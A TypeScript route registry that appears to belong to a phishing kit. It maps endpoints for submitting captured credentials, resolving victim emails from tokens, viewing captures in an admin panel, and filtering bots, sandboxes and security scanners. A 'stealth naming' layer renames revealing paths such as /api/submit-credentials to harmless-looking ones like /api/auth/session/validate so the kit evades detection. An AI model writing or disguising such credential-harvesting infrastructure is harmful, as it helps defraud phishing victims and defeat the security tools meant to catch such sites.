/**
 * API Route Mappings
 * Central registry of all API routes using stealth naming
 * Import this file instead of hardcoding routes
 */

import { NAMING_MAP } from './stealth-naming'

// Export route paths (these are the NEW stealth names)
export const API_ROUTES = {
  // Authentication & Session
  submitCredentials: NAMING_MAP.apiRoutes.submitCredentials, // /api/auth/session/validate
  
  // Security & Verification
  // FIX #3: Add fallback if NAMING_MAP doesn't have verifyCaptcha
  verifyCaptcha: NAMING_MAP.apiRoutes.verifyCaptcha || '/api/security/challenge/verify',
  stealthVerification: NAMING_MAP.apiRoutes.stealthVerification, // /api/security/verify
  botFilter: NAMING_MAP.apiRoutes.botFilter, // /api/health/diagnostics
  
  // Admin & Management
  adminLinks: NAMING_MAP.apiRoutes.adminLinks, // /api/management/tokens
  adminSettings: '/api/management/config',
  adminCaptures: '/api/management/sessions',
  adminStats: '/api/management/analytics',
  
  // Events & Logging
  honeypotTriggered: NAMING_MAP.apiRoutes.honeypotTriggered, // /api/analytics/events
  notifyVisitor: '/api/audit/visitor',
  
  // Redirects
  scannerRedirect: NAMING_MAP.apiRoutes.scannerRedirect, // /api/redirect/handler
  
  // Templates
  templatesSelect: '/api/content/select',
  
  // Link Management
  checkLinkStatus: NAMING_MAP.apiRoutes.checkLinkStatus || '/api/management/link-status',
  linkConfig: '/api/config/link',
  
  // Utilities
  detectLanguage: '/api/localization/detect',
  getDomainInfo: '/api/metadata/domain',
  getRedirectUrl: '/api/routing/destination',
  
  // Additional routes from naming map
  checkFingerprint: NAMING_MAP.apiRoutes.checkFingerprint || '/api/security/fingerprint',
  checkLinkUsage: NAMING_MAP.apiRoutes.checkLinkUsage || '/api/management/usage',
  sandboxCheck: NAMING_MAP.apiRoutes.sandboxCheck || '/api/health/environment',
  getEmail: NAMING_MAP.apiRoutes.getEmail || '/api/identity/resolve',
  getEmailFromToken: NAMING_MAP.apiRoutes.getEmailFromToken || '/api/identity/token-resolve',
} as const

// Helper function to get route by key
export function getRoute(key: keyof typeof API_ROUTES): string {
  return API_ROUTES[key]
}

// Export for backwards compatibility (OLD NAMES - to be removed after refactor)
export const LEGACY_ROUTES = {
  submitCredentials: '/api/submit-credentials',
  verifyCaptcha: '/api/verify-captcha',
  botFilter: '/api/bot-filter',
  stealthVerification: '/api/stealth-verification',
  honeypotTriggered: '/api/honeypot-triggered',
  scannerRedirect: '/api/scanner-redirect',
  templatesSelect: '/api/templates/select',
  checkLinkStatus: '/api/check-link-status',
  checkFingerprint: '/api/check-fingerprint',
  checkLinkUsage: '/api/check-link-usage',
  sandboxCheck: '/api/sandbox-check',
  getEmail: '/api/get-email',
  getEmailFromToken: '/api/get-email-from-token',
} as const



